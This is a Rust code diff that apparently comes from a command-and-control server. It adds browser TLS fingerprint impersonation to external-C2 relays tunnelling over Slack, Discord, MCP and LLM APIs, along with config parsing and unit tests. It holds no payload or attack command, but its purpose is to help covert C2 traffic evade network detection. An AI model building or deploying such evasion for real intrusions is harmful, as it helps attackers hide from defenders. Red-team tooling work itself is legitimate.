@@ -51,6 +51,11 @@
 //! Each relay is opt-in via an environment variable:
 //! - `NYX_EXTC2_SLACK_TOKEN` + `NYX_EXTC2_SLACK_CHANNEL` + `NYX_EXTC2_SLACK_HMAC_KEY` → enables Slack relay
 //! - `NYX_EXTC2_MCP_URL` + `NYX_EXTC2_MCP_KEY` + `NYX_EXTC2_MCP_SESSION` → enables MCP relay
+//! - `NYX_EXTC2_IMPERSONATE` (chrome/firefox/safari/edge) → relay egress TLS
+//!   impersonates that browser via the BoringSSL `wreq` backend. Requires
+//!   nyx-server built with `--features impersonation`; without the feature the
+//!   value is validated at boot but the plain ureq stack is used (with a
+//!   warning). Unset → no impersonation, zero behaviour change.
 //!
 //! The Slack HMAC key is **required and fail-closed**: enabling the Slack
 //! relay without `NYX_EXTC2_SLACK_HMAC_KEY` (or with a malformed / all-zero
@@ -84,6 +89,7 @@ use std::sync::{Arc, Mutex};
 
 // Pull the concrete channel impls + the stack so the boot-time transports can
 // be pushed into the shared `TransportStack`.
+use nyx_transport::fingerprint::BrowserProfile;
 use nyx_transport::mcp::McpTransport;
 use nyx_transport::slack_api::SlackTransport;
 use nyx_transport::TransportStack;
@@ -137,6 +143,11 @@ pub struct ExtC2RelayConfig {
     /// Discord bot token + channel ID + HMAC key. `None` when the Discord
     /// relay is disabled.
     pub discord: Option<DiscordRelay>,
+    /// Browser profile to impersonate on relay egress (`NYX_EXTC2_IMPERSONATE`,
+    /// chrome/firefox/safari/edge). `None` = plain ureq stack (the default).
+    /// Only takes effect when nyx-server is built with `--features
+    /// impersonation`; otherwise it is parsed (and validated) but unused.
+    pub impersonate: Option<BrowserProfile>,
     /// The ONE shared transport stack, built at boot by
     /// [`ExtC2RelayConfig::from_env`] when any relay is enabled. All relay
     /// entry points lock this and send — no per-call transport construction.
@@ -151,6 +162,7 @@ impl std::fmt::Debug for ExtC2RelayConfig {
             .field("llm", &self.llm.is_some())
             .field("discord", &self.discord.is_some())
             .field("mcp", &self.mcp.is_some())
+            .field("impersonate", &self.impersonate.is_some())
             .field("stack", &self.stack.is_some())
             .finish()
     }
@@ -219,16 +231,32 @@ impl ExtC2RelayConfig {
         let mcp = Self::mcp_from_env();
         let llm = Self::llm_from_env()?;
         let discord = Self::discord_from_env()?;
+        let impersonate = Self::impersonate_from_env()?;
 
-        let stack = Self::build_stack(&slack, &mcp, &llm, &discord)?;
+        let stack = Self::build_stack(&slack, &mcp, &llm, &discord, &impersonate)?;
 
         Ok(ExtC2RelayConfig {
             slack,
             mcp,
             llm,
             discord,
+            impersonate,
             stack,
         })
+    }
+
+    /// Parse `NYX_EXTC2_IMPERSONATE` (chrome/firefox/safari/edge). Unset or
+    /// empty → `None` (relays use the plain ureq stack). An unrecognised
+    /// value is a boot error: silently ignoring a typo would run with the
+    /// default rustls fingerprint the operator explicitly tried to override.
+    fn impersonate_from_env() -> Result<Option<BrowserProfile>, String> {
+        match std::env::var("NYX_EXTC2_IMPERSONATE") {
+            Ok(v) if !v.trim().is_empty() => v
+                .parse::<BrowserProfile>()
+                .map(Some)
+                .map_err(|e| format!("NYX_EXTC2_IMPERSONATE: {e}")),
+            _ => Ok(None),
+        }
     }
 
     /// Build the ONE shared transport stack when any relay is enabled.
@@ -238,40 +266,84 @@ impl ExtC2RelayConfig {
         mcp: &Option<McpRelay>,
         llm: &Option<LlmRelay>,
         discord: &Option<DiscordRelay>,
+        impersonate: &Option<BrowserProfile>,
     ) -> Result<Option<Arc<Mutex<TransportStack>>>, String> {
         // Build the ONE shared transport stack when any relay is enabled. The
         // transports are constructed here at boot, not per relay call: each
         // owns an HTTP agent and per-channel rate-limit/cooldown state that
         // must persist across calls (e.g. Slack's 1.2 s inter-message gap).
         let stack = if slack.is_some() || mcp.is_some() || llm.is_some() || discord.is_some() {
+            // Without the `impersonation` feature the BoringSSL backend is
+            // absent (hermetic default build); the env var is still validated
+            // by `impersonate_from_env`, so warn and stay on plain ureq.
+            #[cfg(not(feature = "impersonation"))]
+            if impersonate.is_some() {
+                tracing::warn!(
+                    target: "nyx::extc2",
+                    "NYX_EXTC2_IMPERSONATE is set but nyx-server was built without the \
+                     `impersonation` feature — relay egress keeps the plain ureq TLS stack"
+                );
+            }
             let mut builder = TransportStack::builder();
             if let Some(s) = &slack {
-                builder = builder.push(SlackTransport::new(
+                let transport = SlackTransport::new(
                     s.bot_token.to_string(),
                     s.channel_id.to_string(),
                     &s.session_key,
-                ));
+                );
+                #[cfg(feature = "impersonation")]
+                let transport = match impersonate {
+                    Some(profile) => transport
+                        .with_impersonation(*profile)
+                        .map_err(|e| format!("NYX_EXTC2_IMPERSONATE (slack): {e}"))?,
+                    None => transport,
+                };
+                builder = builder.push(transport);
             }
             if let Some(l) = &llm {
-                builder = builder.push(nyx_transport::llm_api::LlmApiTransport::new(
+                let transport = nyx_transport::llm_api::LlmApiTransport::new(
                     l.api_key.to_string(),
                     l.model.to_string(),
                     l.session_key,
-                ));
+                );
+                #[cfg(feature = "impersonation")]
+                let transport = match impersonate {
+                    Some(profile) => transport
+                        .with_impersonation(*profile)
+                        .map_err(|e| format!("NYX_EXTC2_IMPERSONATE (llm): {e}"))?,
+                    None => transport,
+                };
+                builder = builder.push(transport);
             }
             if let Some(d) = &discord {
-                builder = builder.push(nyx_transport::discord_api::DiscordTransport::new(
+                let transport = nyx_transport::discord_api::DiscordTransport::new(
                     d.bot_token.to_string(),
                     d.channel_id.to_string(),
                     &d.session_key,
-                ));
+                );
+                #[cfg(feature = "impersonation")]
+                let transport = match impersonate {
+                    Some(profile) => transport
+                        .with_impersonation(*profile)
+                        .map_err(|e| format!("NYX_EXTC2_IMPERSONATE (discord): {e}"))?,
+                    None => transport,
+                };
+                builder = builder.push(transport);
             }
             if let Some(m) = &mcp {
-                builder = builder.push(McpTransport::new(
+                let transport = McpTransport::new(
                     m.server_url.to_string(),
                     m.session_id.to_string(),
                     m.api_key.to_string(),
-                ));
+                );
+                #[cfg(feature = "impersonation")]
+                let transport = match impersonate {
+                    Some(profile) => transport
+                        .with_impersonation(*profile)
+                        .map_err(|e| format!("NYX_EXTC2_IMPERSONATE (mcp): {e}"))?,
+                    None => transport,
+                };
+                builder = builder.push(transport);
             }
             let stack = builder
                 .build()
@@ -523,6 +595,7 @@ mod tests {
         assert!(cfg.llm.is_none());
         assert!(cfg.discord.is_none());
         assert!(cfg.stack.is_none());
+        assert!(cfg.impersonate.is_none());
         assert!(!cfg.any_enabled());
     }
 
@@ -716,6 +789,67 @@ mod tests {
     }
 
     #[test]
+    fn from_env_parses_impersonate_profile() {
+        let _g = ENV_LOCK.lock();
+        clear_all_env();
+        for (value, expected) in [
+            ("chrome", BrowserProfile::Chrome),
+            ("firefox", BrowserProfile::Firefox),
+            ("safari", BrowserProfile::Safari),
+            ("edge", BrowserProfile::Edge),
+        ] {
+            std::env::set_var("NYX_EXTC2_IMPERSONATE", value);
+            let cfg = ExtC2RelayConfig::from_env().unwrap();
+            assert_eq!(cfg.impersonate, Some(expected), "value {value:?}");
+        }
+        clear_all_env();
+    }
+
+    #[test]
+    fn from_env_rejects_unknown_impersonate_profile() {
+        let _g = ENV_LOCK.lock();
+        clear_all_env();
+        std::env::set_var("NYX_EXTC2_IMPERSONATE", "netscape");
+        let err = ExtC2RelayConfig::from_env().unwrap_err();
+        assert!(
+            err.contains("NYX_EXTC2_IMPERSONATE"),
+            "error must name the offending var: {err}"
+        );
+        // Whitespace-only counts as unset (not an error).
+        std::env::set_var("NYX_EXTC2_IMPERSONATE", "   ");
+        assert!(ExtC2RelayConfig::from_env().unwrap().impersonate.is_none());
+        clear_all_env();
+    }
+
+    #[test]
+    fn impersonate_alone_does_not_enable_any_relay() {
+        let _g = ENV_LOCK.lock();
+        clear_all_env();
+        std::env::set_var("NYX_EXTC2_IMPERSONATE", "chrome");
+        let cfg = ExtC2RelayConfig::from_env().unwrap();
+        assert_eq!(cfg.impersonate, Some(BrowserProfile::Chrome));
+        // Impersonation only shapes egress of an enabled relay; by itself it
+        // must not build the stack or flip any channel on.
+        assert!(!cfg.any_enabled());
+        assert!(cfg.stack.is_none());
+        clear_all_env();
+    }
+
+    #[test]
+    fn impersonate_with_relay_still_builds_stack() {
+        let _g = ENV_LOCK.lock();
+        clear_all_env();
+        std::env::set_var("NYX_EXTC2_SLACK_TOKEN", "xoxb-test");
+        std::env::set_var("NYX_EXTC2_SLACK_CHANNEL", "C123");
+        std::env::set_var("NYX_EXTC2_SLACK_HMAC_KEY", "ab".repeat(32));
+        std::env::set_var("NYX_EXTC2_IMPERSONATE", "edge");
+        let cfg = ExtC2RelayConfig::from_env().unwrap();
+        assert_eq!(cfg.impersonate, Some(BrowserProfile::Edge));
+        assert!(cfg.stack.is_some(), "relay enabled ⇒ shared stack built");
+        clear_all_env();
+    }
+
+    #[test]
     fn decode_hmac_key_roundtrip_and_errors() {
         // Exact 64-hex roundtrip.
         assert_eq!(decode_hmac_key(&"ab".repeat(32)), Ok([0xab; 32]));
@@ -752,6 +886,7 @@ mod tests {
             "NYX_EXTC2_DISCORD_TOKEN",
             "NYX_EXTC2_DISCORD_CHANNEL",
             "NYX_EXTC2_DISCORD_HMAC_KEY",
+            "NYX_EXTC2_IMPERSONATE",
         ] {
             std::env::remove_var(k);
         }
